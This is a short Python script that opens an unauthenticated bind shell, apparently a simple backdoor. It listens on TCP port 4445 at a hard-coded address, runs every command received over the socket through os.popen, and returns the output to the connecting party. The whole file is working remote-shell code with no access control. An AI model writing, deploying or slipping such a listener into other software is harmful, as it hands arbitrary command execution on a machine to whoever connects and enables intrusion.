#!/usr/bin/python3
#coding = UTF-8

#################################
#           notyeat             #
#                               #
#################################
import socket,time
import os
ip = '172.24.0.24'  #设置服务器的IP
port = 4445         #设置服务器的端口
client = socket.socket(2,socket.SOCK_STREAM)
client.bind((ip,port))
client.listen(1)
while True:
    conn,addr = client.accept()
    print('Connect by',addr)
    while True:
        data = conn.recv(1024)
        data = str(data,encoding='utf-8')
        if data == 'exit':
            time.sleep(2)
            os._exit(0)
        if data[:2] == 'cd':
            os.chdir(data[3:])
            conn.sendall(b'moved')
        else:
            response = os.popen(data, mode='r').read()
            if response == '' or response == None:
                conn.sendall(b'nonono')
            response = bytes(response,encoding='utf-8')
            conn.sendall(response)
    conn.close()
client.close()